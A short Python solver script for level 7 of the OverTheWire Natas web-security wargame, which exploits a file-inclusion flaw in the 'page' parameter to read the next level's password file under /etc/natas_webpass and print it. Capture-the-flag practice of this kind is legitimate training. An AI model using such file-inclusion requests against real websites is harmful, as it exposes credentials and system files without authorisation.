import requests, natas, natas6
URL = 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
USER = 'natas7'
PASS = natas6.flag
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)

flag = natas.get_flag(URL, auth_basic)

if __name__ == '__main__':
    print(natas.msg, flag)